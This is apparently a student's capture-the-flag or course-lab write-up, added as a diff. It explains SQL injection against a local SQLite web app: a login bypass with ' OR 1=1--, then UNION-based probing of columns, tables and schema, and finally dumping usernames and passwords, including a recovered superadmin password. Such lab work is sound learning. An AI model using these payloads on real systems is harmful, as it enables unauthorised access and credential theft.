@@ -1,0 +1,33 @@
+Run the application locally and first  go to /the login page 
+
+initially, to connect as a user I used the expression ' OR 1=1-- 
+the SQL expression you can use to search for the password is
+query = SELECT * FROM users WHERE username = 'user' AND password = 'password' the password is that the user gives for login.
+if put  the expression ' OR 1=1--  the query which will be given to the database is 
+SELECT * FROM users WHERE username = 'user' AND password = ''OR 1=1--' the 1=1 is always true with the OR operator don't need to know the password, the ' is used to terminating the single quotes of password and -- to put in comments the rest of the command .it means to avoid the '. 
+
+I don't understand if we must use the table that is given in the exercise for that reason I tried to find some information on my own.
+Because in the assignment tell me that the items table has four columns but when I tried it, the application threw an error, so I take it from scratch.
+After the login, we are in the /dashboard field that asks us to search for an item. The exercise asks to take pieces of information about the users.
+if  I ignore the table that gives to me in the assignment then the first thing I have to do is find how many columns the item table has. 
+Again the query is something like 
+SELECT name, category, price FROM items WHERE name = 'name' with name field to be the item that asks us to search. 
+To find the column number, I just need to write ' UNION SELECT NULL-- this cause an error and then tried ' UNION SELECT NULL, NULL--  this cause an error too but ' UNION SELECT NULL, NULL,NULL-- works and gives as a result so we understand that the table item has three columns. we don’t get an error only when the number of “NULL” values equals the number of the table’s columns.
+this information is useful because we will do others unions with the same table.
+' UNION SELECT 1,1,sqlite_version()--  to find if the version is SQLite something that can read also in the app.py but worth a try to check it. So in the third column, the SQLite version appears.
+Now I know the version and after  a lot of searching on the internet on how to take the name of the  tables that exist in the database  find out  this query
+' UNION SELECT 1,1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'limit 1 offset 0-- 
+this gives as result the name 'item ' that is one of the tables that exist on the database; the limit and the offset needed because we can not see lots of names at the same time. So use the same query with other limits to take all the tables.
+' UNION SELECT 1,1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'limit 2 offset 1--  
+take the name 'users' the second  table;
+' UNION SELECT 1,1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'limit 3 offset 2--
+error so we have two table items and a user.
+Now take the fields of users table ' UNION SELECT 1, 1, name FROM pragma_table_info('users') limit 1 offset 0 --
+in the same way that limits and offset worked before.(id,username,password).
+Final attack 
+' UNION SELECT id, password,username FROM users limit 1 offset 0 -- 
+that gives us the password,id ,username of the superadmin
+' UNION SELECT id, password,username FROM users limit 2 offset 1 -- 
+that gives us the password,id ,username of the user
+ in the actual application the password of superadmin is:sup3r4dm1nP@5sw0rd
+ then I go to the admin page and log in to take the flag.
